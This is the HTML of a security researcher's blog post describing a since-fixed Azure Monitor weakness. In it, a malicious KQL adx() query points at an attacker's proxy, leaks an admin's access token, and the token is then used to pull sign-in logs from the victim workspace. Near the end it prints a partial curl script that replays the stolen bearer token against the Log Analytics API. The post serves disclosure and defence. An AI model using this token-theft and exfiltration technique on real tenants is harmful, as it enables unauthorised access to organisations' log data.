+<script crossorigin="anonymous" type="text/javascript" src="https://s0.wp.com/_static/??-eJyVkd1OwzAMhV+IzN0FmrhAPMqUJqZz8+PgON369mSioIFAGjeJbJ9zPiuBczGOs2JWmCskHimiaRXFTr1nKL/ybq4PcKNLzZTYJsoVZtRiXdjqbucMR8oOxkbRg2C0it4Urlq/V7tE+WdwX0CimiJ8WT9nPSw2j/U6nN8ayrpdtwF/ikyiSTr0N5qeMHVLEUzUEmQKtl0DaiQXPs57LdtGC+G5sKg7oQsodwO1o1YTSP/50lvvuGD2LGCbcrLa077UC3nkDqx1+5FIIygHzGYU8hN24kt63h+GYTjsH5+G+R1wgMdN"></script>
+<script type="text/javascript" id="rlt-proxy-js-after">
+/* <![CDATA[ */
+	window.addEventListener( 'DOMContentLoaded', function() {
+		rltInitialize( {"token":null,"iframeOrigins":["https:\/\/widgets.wp.com"]} );
+	} );
+/* ]]> */
+</script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://securecloud188323504.wordpress.com/xmlrpc.php?rsd">
+<meta name="generator" content="WordPress.com">
+<link rel="canonical" href="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/">
+<link rel="shortlink" href="https://wp.me/p9VuXI-1Gx">
+<link rel="alternate" type="application/json+oembed" href="https://public-api.wordpress.com/oembed/?format=json&amp;url=https%3A%2F%2Fsecurecloud.blog%2F2022%2F04%2F27%2Fazure-monitor-malicious-kql-query%2F&amp;for=wpcom-auto-discovery"><link rel="alternate" type="application/xml+oembed" href="https://public-api.wordpress.com/oembed/?format=xml&amp;url=https%3A%2F%2Fsecurecloud.blog%2F2022%2F04%2F27%2Fazure-monitor-malicious-kql-query%2F&amp;for=wpcom-auto-discovery">
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="article">
+<meta property="og:title" content="Azure Monitor – Malicious KQL Query">
+<meta property="og:url" content="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/">
+<meta property="og:description" content="Malicious KQL Query: Malicious KQL query is injection technique, where attacker with targetable workspace resourceID can inject listener of access tokens in the query. The attacker then uses the ga…">
+<meta property="article:published_time" content="2022-04-27T07:14:47+00:00">
+<meta property="article:modified_time" content="2022-05-06T13:44:23+00:00">
+<meta property="og:site_name" content="SecureCloudBlog">
+<meta property="og:image" content="https://securecloud.blog/wp-content/uploads/2022/04/image-12.png">
+<meta property="og:image:width" content="861">
+<meta property="og:image:height" content="598">
+<meta property="og:image:alt" content="">
+<meta property="og:locale" content="fi_FI">
+<meta property="article:publisher" content="https://www.facebook.com/WordPresscom">
+<meta name="twitter:text:title" content="Azure Monitor – Malicious KQL&nbsp;Query">
+<meta name="twitter:image" content="https://securecloud.blog/wp-content/uploads/2022/04/image-12.png?w=640">
+<meta name="twitter:card" content="summary_large_image">
+
+<!-- End Jetpack Open Graph Tags -->
+<link rel="search" type="application/opensearchdescription+xml" href="https://securecloud.blog/osd.xml" title="SecureCloudBlog">
+<link rel="search" type="application/opensearchdescription+xml" href="https://s1.wp.com/opensearch.xml" title="WordPress.com">
+<meta name="theme-color" content="#ffffff">
+	<style type="text/css">
+					#front-section-threecolumn .entry-summary {display: block;}
+							#front-section-fourcolumn .entry-summary {display: block;}
+			</style>
+	<meta name="application-name" content="SecureCloudBlog"><meta name="msapplication-window" content="width=device-width;height=device-height"><meta name="description" content="Malicious KQL Query: Malicious KQL query is injection technique, where attacker with targetable workspace resourceID can inject listener of access tokens in the query. The attacker then uses the gained access token to exfiltrate data from the workspace I was recently working on an PoC for combining data on both Azure Monitor and Azure Data…">
+<style type="text/css" id="custom-background-css">
+body.custom-background { background-color: #ffffff; }
+</style>
+	<link rel="icon" href="https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=32" sizes="32x32">
+<link rel="icon" href="https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=191" sizes="192x192">
+<link rel="apple-touch-icon" href="https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=180">
+<meta name="msapplication-TileImage" content="https://securecloud.blog/wp-content/uploads/2018/09/cropped-sec.png?w=191">
+<!-- Your Google Analytics Plugin is missing the tracking ID -->
+<link rel="stylesheet" type="text/css" href="https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b"><link rel="stylesheet" type="text/css" href="https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?m=1363304414i&amp;amp;ver=3.0.9b"><link rel="stylesheet" id="gravatar-card-css" href="https://0.gravatar.com/js/hovercards/hovercards.min.css?ver=2024244cee4591fae4bea45ee2571078613ea2fab8a404a7b5ceb1cf2b511ebc67fadd"><link href="https://s0.wp.com/wp-content/mu-plugins/actionbar/actionbar.css?v=20240115" type="text/css" rel="stylesheet"></head>
+
+<body class="post-template-default single single-post postid-6481 single-format-standard custom-background wp-embed-responsive customizer-styles-applied has-thumb custom-logo-on jetpack-reblog-enabled imgfade-on">
+
+<header id="masthead" class="site-header cf" role="banner">
+	<div class="site-header-content">
+		<div id="site-branding">
+							<p class="site-title"><a href="https://securecloud.blog/" rel="home">SecureCloudBlog</a></p>
+			
+			
+			
+			<button id="overlay-open" class="overlay-open overlay-btn"><span>Valikko</span></button>
+
+					</div><!-- end #site-branding -->
+		<nav id="desktop-navigation" class="desktop-navigation cf" role="navigation">
+			<div class="menu"><ul>
+<li><a href="https://securecloud.blog/">Etusivu</a></li><li class="page_item page-item-2652"><a href="https://securecloud.blog/about/">About</a></li>
+<li class="page_item page-item-2574"><a href="https://securecloud.blog/metapage-or-metastuff-not-directly-technical-like-rest-of-the-blog/">Meta</a></li>
+<li class="page_item page-item-5 current_page_parent"><a href="https://securecloud.blog/blog/">Blog</a></li>
+</ul></div>
+		</nav><!-- .main-navigation -->
+		<button id="search-open" class="search-open search-btn"><span>Etsi</span></button>
+			<div class="desktop-search">
+				<form role="search" method="get" class="search-form" action="https://securecloud.blog/">
+				<label>
+					<span class="screen-reader-text">Haku:</span>
+					<input type="search" class="search-field" placeholder="Haku …" value="" name="s">
+				</label>
+				<input type="submit" class="search-submit" value="Hae">
+			</form>			</div><!-- end .desktop-search -->
+	</div><!-- .site-header-content -->
+
+	<div class="sticky-header hidden" aria-hidden="true">
+		<button id="overlay-open-sticky" class="overlay-open overlay-btn"><span>Valikko</span></button>
+		<button id="search-open-sticky" class="search-open search-btn"><span>Etsi</span></button>
+
+					<p class="site-title"><a href="https://securecloud.blog/" rel="home">SecureCloudBlog</a></p>
+		
+			</div><!-- end .sticky-header -->
+
+	<div class="inner-offcanvas-wrap">
+		<div class="close-btn-wrap">
+			<button id="overlay-close" class="overlay-btn"><span>Sulje</span></button>
+		</div><!-- end .close-btn-wrap -->
+		<div class="mobile-search">
+			<form role="search" method="get" class="search-form" action="https://securecloud.blog/">
+				<label>
+					<span class="screen-reader-text">Haku:</span>
+					<input type="search" class="search-field" placeholder="Haku …" value="" name="s">
+				</label>
+				<input type="submit" class="search-submit" value="Hae">
+			</form>		</div><!-- end .mobile-search -->
+
+				<nav id="overlay-nav" class="main-nav cf" role="navigation">
+		<div class="menu"><ul>
+<li><a href="https://securecloud.blog/">Etusivu</a></li><li class="page_item page-item-2652"><a href="https://securecloud.blog/about/">About</a></li>
+<li class="page_item page-item-2574"><a href="https://securecloud.blog/metapage-or-metastuff-not-directly-technical-like-rest-of-the-blog/">Meta</a></li>
+<li class="page_item page-item-5 current_page_parent"><a href="https://securecloud.blog/blog/">Blog</a></li>
+</ul></div>
+		</nav><!-- .main-navigation -->
+
+		
+<aside id="sidebar-offcanvas" class="sidebar-offcanvas cf" role="complementary">
+			<div class="widget-area">
+			<section id="text-3" class="widget widget_text">			<div class="textwidget"><p><em><strong>Disclaimer:</strong> The information in this weblog is provided “AS IS” with no warranties and confers no rights.</em></p>
+</div>
+		</section>		</div><!-- .widget-area -->
+	
+</aside><!-- .sidebar-offcanvas -->
+
+	</div><!-- end .desktop-offcanvas-wrap -->
+</header><div id="overlay-wrap" class="overlay-wrap cf"></div><!-- end #masthead -->
+
+
+<div id="singlepost-wrap" class="singlepost-wrap cf">
+
+	
+		
+<article id="post-6481" class="post-6481 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+	<header class="entry-header cf">
+		
+		<div class="title-wrap">
+						<div class="entry-cats">
+				<a href="https://securecloud.blog/category/uncategorized/" rel="category tag">Uncategorized</a>			</div><!-- end .entry-cats -->
+						<h1 class="entry-title">Azure Monitor – Malicious KQL&nbsp;Query</h1>
+			
+		</div><!-- end .title-wrap -->
+
+		<div class="entry-meta cf">
+			<div class="meta-columnone">
+				<div class="author-pic">
+					<img alt="" src="https://1.gravatar.com/avatar/11e06d0a052f195711c44bab3ccfaf85495349fb21121c9534aca4b2860dd011?s=100&amp;d=identicon&amp;r=G" srcset="https://1.gravatar.com/avatar/11e06d0a052f195711c44bab3ccfaf85495349fb21121c9534aca4b2860dd011?s=100&amp;d=identicon&amp;r=G 1x, https://1.gravatar.com/avatar/11e06d0a052f195711c44bab3ccfaf85495349fb21121c9534aca4b2860dd011?s=150&amp;d=identicon&amp;r=G 1.5x, https://1.gravatar.com/avatar/11e06d0a052f195711c44bab3ccfaf85495349fb21121c9534aca4b2860dd011?s=200&amp;d=identicon&amp;r=G 2x, https://1.gravatar.com/avatar/11e06d0a052f195711c44bab3ccfaf85495349fb21121c9534aca4b2860dd011?s=300&amp;d=identicon&amp;r=G 3x, https://1.gravatar.com/avatar/11e06d0a052f195711c44bab3ccfaf85495349fb21121c9534aca4b2860dd011?s=400&amp;d=identicon&amp;r=G 4x" class="avatar avatar-100 wp-hovercard-attachment grav-hashed grav-hijack" height="100" width="100" loading="lazy" decoding="async">				</div><!-- end .author-pic -->
+
+				<div class="entry-author"> julkaissut <span class="author vcard"><a class="url fn n" href="https://securecloud.blog/author/santasalojh/">Joosua Santasalo</a></span></div><div class="entry-date"><a href="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/" rel="bookmark"><time class="entry-date published updated" datetime="2022-04-27T07:14:47+00:00">27 huhtikuun, 2022</time></a></div>
+			</div><!-- end .meta-columnone -->
+
+			<div class="meta-columntwo">
+								<div class="entry-comments-single">
+					<span class="entry-comments"><a href="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/#respond">Comments 0</a></span>				</div><!-- end .entry-comments -->
+							</div><!-- end .meta-columntwo -->
+
+			<div class="meta-columnthree">
+							</div><!-- end .meta-columnthree -->
+		</div><!-- end .entry-meta -->
+	</header><!-- end .entry-header -->
+
+	<div class="contentwrap">
+					<div class="entry-thumbnail">
+				<a href="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/"><img width="861" height="598" src="https://securecloud.blog/wp-content/uploads/2022/04/image-12.png?w=861" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" data-attachment-id="6482" data-permalink="https://securecloud.blog/image-12-26/" data-orig-file="https://securecloud.blog/wp-content/uploads/2022/04/image-12.png" data-orig-size="861,598" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-12" data-image-description="" data-image-caption="" data-medium-file="https://securecloud.blog/wp-content/uploads/2022/04/image-12.png?w=300" data-large-file="https://securecloud.blog/wp-content/uploads/2022/04/image-12.png?w=861"></a>
+			</div><!-- end .entry-thumbnail -->
+		
+		<div id="socialicons-sticky">
+			<div id="entry-content" class="entry-content">
+				
+<p class="has-light-grey-color has-dark-blue-background-color has-text-color has-background"><strong>Malicious KQL Query</strong>: Malicious KQL query is injection technique, where attacker with targetable workspace resourceID can inject <strong>listener </strong>of access tokens in the query. The attacker then uses the gained access token to exfiltrate data from the workspace</p>
+
+
+
+<p>I was recently working on an PoC for combining data on both Azure Monitor and Azure Data Explorer. My aim was to create some cross-service analytical capabilities until  I stumbled upon some unexpected behavior.</p>
+
+
+
+<p><strong>Update</strong> – 06.05.2022</p>
+
+
+
+<ul class="wp-block-list"><li>It seems that fix has now been issued changing the previous by-design behaviour. This makes Log Analytics use a lot safer, in terms of running queries in the workspace ✅</li><li>This blog will remain here as documentation for one of the coolest attacks I’ve discovered during my researcher tenure</li></ul>
+
+
+
+<figure class="wp-block-image size-large"><img data-attachment-id="6570" data-permalink="https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/image-11-27/" data-orig-file="https://securecloud.blog/wp-content/uploads/2022/05/image-11.png" data-orig-size="812,459" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-11" data-image-description="" data-image-caption="" data-medium-file="https://securecloud.blog/wp-content/uploads/2022/05/image-11.png?w=300" data-large-file="https://securecloud.blog/wp-content/uploads/2022/05/image-11.png?w=812" width="812" height="459" src="https://securecloud.blog/wp-content/uploads/2022/05/image-11.png?w=812" alt="" class="wp-image-6570" srcset="https://securecloud.blog/wp-content/uploads/2022/05/image-11.png 812w, https://securecloud.blog/wp-content/uploads/2022/05/image-11.png?w=150 150w, https://securecloud.blog/wp-content/uploads/2022/05/image-11.png?w=300 300w, https://securecloud.blog/wp-content/uploads/2022/05/image-11.png?w=768 768w" sizes="(max-width: 812px) 100vw, 812px"></figure>
+
+
+
+<p><br></p>
+
+
+
+<p class="has-dark-color has-light-grey-background-color has-text-color has-background"><strong>Disclaimer</strong> ⚠️<br>Everytime I discover some behavior that is not fully clear to me, I engage with<br>the security personel of MSRC (Microsoft Security Response Center) –<br>This time was no exception, as we worked together with MSRC to confirm that<br>this is by-design behavior of the service in scope – Thus I was able publish this<br>article.</p>
+
+
+
+<h2 class="wp-block-heading">Discovery</h2>
+
+
+
+<p>My assumption so far has been that Log Analytics is sandboxed environment,<br>especially in terms of queries (e.g., queries don’t take pipeline input, that would<br>influence the call to external service) – What this assumption means in plain<br>terms is, that you can’t run query that will leak the data of the workspace to<br>external service.</p>
+
+
+
+<p> It turns out, that my assumption was wrong, at least when we use some indirect<br>methods to gain access to the workspace from outside.</p>
+
+
+
+<figure class="wp-block-image size-large"><img data-attachment-id="6488" data-permalink="https://securecloud.blog/image-13-26/" data-orig-file="https://securecloud.blog/wp-content/uploads/2022/04/image-13.png" data-orig-size="878,215" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-13" data-image-description="" data-image-caption="" data-medium-file="https://securecloud.blog/wp-content/uploads/2022/04/image-13.png?w=300" data-large-file="https://securecloud.blog/wp-content/uploads/2022/04/image-13.png?w=878" loading="lazy" width="878" height="215" src="https://securecloud.blog/wp-content/uploads/2022/04/image-13.png?w=878" alt="" class="wp-image-6488" srcset="https://securecloud.blog/wp-content/uploads/2022/04/image-13.png 878w, https://securecloud.blog/wp-content/uploads/2022/04/image-13.png?w=150 150w, https://securecloud.blog/wp-content/uploads/2022/04/image-13.png?w=300 300w, https://securecloud.blog/wp-content/uploads/2022/04/image-13.png?w=768 768w" sizes="(max-width: 878px) 100vw, 878px"><figcaption><a href="https://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/externaldata-operator?pivots=azuremonitor" target="_blank" rel="noreferrer noopener">https://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/externaldata-operator?pivots=azuremonitor</a></figcaption></figure>
+
+
+
+<p></p>
+
+
+
+<h2 class="wp-block-heading">Scope<br></h2>
+
+
+
+<ul class="wp-block-list"><li>Sensitive information disclosure – Access token is leaked as soon as the admin runs the query</li></ul>
+
+
+
+<figure class="wp-block-image size-large"><img data-attachment-id="6504" data-permalink="https://securecloud.blog/image-18-26/" data-orig-file="https://securecloud.blog/wp-content/uploads/2022/04/image-18.png" data-orig-size="963,698" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-18" data-image-description="" data-image-caption="" data-medium-file="https://securecloud.blog/wp-content/uploads/2022/04/image-18.png?w=300" data-large-file="https://securecloud.blog/wp-content/uploads/2022/04/image-18.png?w=950" loading="lazy" width="963" height="698" src="https://securecloud.blog/wp-content/uploads/2022/04/image-18.png?w=963" alt="" class="wp-image-6504" srcset="https://securecloud.blog/wp-content/uploads/2022/04/image-18.png 963w, https://securecloud.blog/wp-content/uploads/2022/04/image-18.png?w=150 150w, https://securecloud.blog/wp-content/uploads/2022/04/image-18.png?w=300 300w, https://securecloud.blog/wp-content/uploads/2022/04/image-18.png?w=768 768w" sizes="(max-width: 963px) 100vw, 963px"></figure>
+
+
+
+<ul class="wp-block-list"><li>Data exfiltration – This requires that the attacker knows where to direct the query (needs to know the resourceId besides using the access token)</li></ul>
+
+
+
+<figure class="wp-block-image size-large"><img data-attachment-id="6506" data-permalink="https://securecloud.blog/image-19-26/" data-orig-file="https://securecloud.blog/wp-content/uploads/2022/04/image-19.png" data-orig-size="887,513" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-19" data-image-description="" data-image-caption="" data-medium-file="https://securecloud.blog/wp-content/uploads/2022/04/image-19.png?w=300" data-large-file="https://securecloud.blog/wp-content/uploads/2022/04/image-19.png?w=887" loading="lazy" width="887" height="513" src="https://securecloud.blog/wp-content/uploads/2022/04/image-19.png?w=887" alt="" class="wp-image-6506" srcset="https://securecloud.blog/wp-content/uploads/2022/04/image-19.png 887w, https://securecloud.blog/wp-content/uploads/2022/04/image-19.png?w=150 150w, https://securecloud.blog/wp-content/uploads/2022/04/image-19.png?w=300 300w, https://securecloud.blog/wp-content/uploads/2022/04/image-19.png?w=768 768w" sizes="(max-width: 887px) 100vw, 887px"></figure>
+
+
+
+<h2 class="wp-block-heading">Introducing adx() method</h2>
+
+
+
+<p><em>Azure Monitor supports cross-service queries between Azure Data Explorer,&nbsp;<a href="https://docs.microsoft.com/en-us/azure/azure-monitor/app/app-insights-overview">Application Insights</a>, and&nbsp;<a href="https://docs.microsoft.com/en-us/azure/azure-monitor/logs/data-platform-logs">Log Analytics</a>. You can then query your Azure Data Explorer cluster by using Log Analytics/Application Insights tools and refer to it in a cross-service query</em> <a rel="noreferrer noopener" href="https://docs.microsoft.com/en-us/azure/azure-monitor/logs/azure-monitor-data-explorer-proxy" target="_blank">https://docs.microsoft.com/en-us/azure/azure-monitor/logs/azure-monitor-data-explorer-proxy</a></p>
+
+
+
+<figure class="wp-block-image size-large"><img data-attachment-id="6492" data-permalink="https://securecloud.blog/image-14-26/" data-orig-file="https://securecloud.blog/wp-content/uploads/2022/04/image-14.png" data-orig-size="1212,894" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-14" data-image-description="" data-image-caption="" data-medium-file="https://securecloud.blog/wp-content/uploads/2022/04/image-14.png?w=300" data-large-file="https://securecloud.blog/wp-content/uploads/2022/04/image-14.png?w=950" loading="lazy" width="1024" height="755" src="https://securecloud.blog/wp-content/uploads/2022/04/image-14.png?w=1024" alt="" class="wp-image-6492" srcset="https://securecloud.blog/wp-content/uploads/2022/04/image-14.png?w=1024 1024w, https://securecloud.blog/wp-content/uploads/2022/04/image-14.png?w=150 150w, https://securecloud.blog/wp-content/uploads/2022/04/image-14.png?w=300 300w, https://securecloud.blog/wp-content/uploads/2022/04/image-14.png?w=768 768w, https://securecloud.blog/wp-content/uploads/2022/04/image-14.png 1212w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://docs.microsoft.com/en-us/azure/azure-monitor/logs/azure-monitor-data-explorer-proxy">https://docs.microsoft.com/en-us/azure/azure-monitor/logs/azure-monitor-data-explorer-proxy</a></figcaption></figure>
+
+
+
+<h2 class="wp-block-heading">Exfiltrating access tokens leads to exfiltrating data</h2>
+
+
+
+<p>adx() methods allows us to query for data in Azure Data Explorer workspaces,<br>but it also allows us to define an arbitrary url as the ADX cluster address.<br>Since the authentication to ADX is done with JWT token, the JWT token<br>gets exposed in this process. This JWT token in turn is good to be used as<br>cross-workspace query from <a href="https://help.kusto.windows.net" target="_blank" rel="noreferrer noopener">public demo instance</a> the  the attacker will be using.</p>
+
+
+
+<h2 class="wp-block-heading">Setting up the PoC</h2>
+
+
+
+<figure class="wp-block-image size-large"><img data-attachment-id="6496" data-permalink="https://securecloud.blog/image-15-26/" data-orig-file="https://securecloud.blog/wp-content/uploads/2022/04/image-15.png" data-orig-size="861,598" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-15" data-image-description="" data-image-caption="" data-medium-file="https://securecloud.blog/wp-content/uploads/2022/04/image-15.png?w=300" data-large-file="https://securecloud.blog/wp-content/uploads/2022/04/image-15.png?w=861" loading="lazy" width="861" height="598" src="https://securecloud.blog/wp-content/uploads/2022/04/image-15.png?w=861" alt="" class="wp-image-6496" srcset="https://securecloud.blog/wp-content/uploads/2022/04/image-15.png 861w, https://securecloud.blog/wp-content/uploads/2022/04/image-15.png?w=150 150w, https://securecloud.blog/wp-content/uploads/2022/04/image-15.png?w=300 300w, https://securecloud.blog/wp-content/uploads/2022/04/image-15.png?w=768 768w" sizes="(max-width: 861px) 100vw, 861px"><figcaption>Figure 2: img</figcaption></figure>
+
+
+
+<p>First thing I did, was to create an proxy server that intercepts the call to demo<br>instance of ADX, and returns dummy data for Log Analytics, while the proxy<br>service stores the leaked JWT token<br>• After the server had intercepted the call, I dumped the token to the server,<br>and for demonstrative purposes made the call in seperate curl request<br>(instead of calling from the Node.JS processes)</p>
+
+
+
+<figure class="wp-block-image size-large"><img data-attachment-id="6497" data-permalink="https://securecloud.blog/image-16-26/" data-orig-file="https://securecloud.blog/wp-content/uploads/2022/04/image-16.png" data-orig-size="933,588" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-16" data-image-description="" data-image-caption="" data-medium-file="https://securecloud.blog/wp-content/uploads/2022/04/image-16.png?w=300" data-large-file="https://securecloud.blog/wp-content/uploads/2022/04/image-16.png?w=933" loading="lazy" width="933" height="588" src="https://securecloud.blog/wp-content/uploads/2022/04/image-16.png?w=933" alt="" class="wp-image-6497" srcset="https://securecloud.blog/wp-content/uploads/2022/04/image-16.png 933w, https://securecloud.blog/wp-content/uploads/2022/04/image-16.png?w=150 150w, https://securecloud.blog/wp-content/uploads/2022/04/image-16.png?w=300 300w, https://securecloud.blog/wp-content/uploads/2022/04/image-16.png?w=768 768w" sizes="(max-width: 933px) 100vw, 933px"></figure>
+
+
+
+<p><strong>the call extracts signin logs from the victim workspace</strong></p>
+
+
+
+<figure class="wp-block-image size-large"><img data-attachment-id="6499" data-permalink="https://securecloud.blog/image-17-26/" data-orig-file="https://securecloud.blog/wp-content/uploads/2022/04/image-17.png" data-orig-size="904,419" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-17" data-image-description="" data-image-caption="" data-medium-file="https://securecloud.blog/wp-content/uploads/2022/04/image-17.png?w=300" data-large-file="https://securecloud.blog/wp-content/uploads/2022/04/image-17.png?w=904" loading="lazy" width="904" height="419" src="https://securecloud.blog/wp-content/uploads/2022/04/image-17.png?w=904" alt="" class="wp-image-6499" srcset="https://securecloud.blog/wp-content/uploads/2022/04/image-17.png 904w, https://securecloud.blog/wp-content/uploads/2022/04/image-17.png?w=150 150w, https://securecloud.blog/wp-content/uploads/2022/04/image-17.png?w=300 300w, https://securecloud.blog/wp-content/uploads/2022/04/image-17.png?w=768 768w" sizes="(max-width: 904px) 100vw, 904px"></figure>
+
+
+
+<h2 class="wp-block-heading">Attack video</h2>
+
+
+
+<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
+<span class="embed-youtube" style="text-align:center; display: block;"><iframe class="youtube-player" width="950" height="535" src="https://www.youtube.com/embed/ha2OxC1dfNk?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=fi&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" style="border:0;" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation allow-popups-to-escape-sandbox"></iframe></span>
+</div></figure>
+
+
+
+<h2 class="wp-block-heading">Attack details</h2>
+
+
+
+<p>Curl command which is used to call Log Analytics API outside the MITM server</p>
+
+
+<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_869907" class="syntaxhighlighter  bash"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="bash plain">token=$(</code><code class="bash functions">cat</code> <code class="bash plain">tkn.txt)</code></div><div class="line number2 index1 alt1"><code class="bash plain">ws=</code><code class="bash string">"subscriptions/3539d2a2-cd25-48c6-b295-14e69334ef1c/resourceGroups/rg-laws/providers/Microsoft.OperationalInsights/workspaces/hublaws/"</code></div><div class="line number3 index2 alt2"><code class="bash plain">laName =</code><code class="bash string">"hublaws"</code></div><div class="line number4 index3 alt1"><code class="bash plain">curl </code><code class="bash string">"<a href="https://ade.loganalytics.io/">https://ade.loganalytics.io/</a>${ws}/v2/rest/query"</code> <code class="bash plain">\</code></div><div class="line number5 index4 alt2"><code class="bash plain">-H </code><code class="bash string">"authorization: Bearer ${token}"</code> <code class="bash plain">\</code></div><div class="line number6 index5 alt1"><code class="bash plain">-H </code><code class="bash string">'content-type: application/json; charset=UTF-8'</code> <code class="bash plain">\</code></div><div class="line number7 index6 alt2"><code class="bash plain">-H </code><code class="bash string">'accept: application/json'</code> <code class="bash plain">\</code></div><div class="line number8 index7 alt1"><code class="bash plain">--data-raw </code><code class="bash 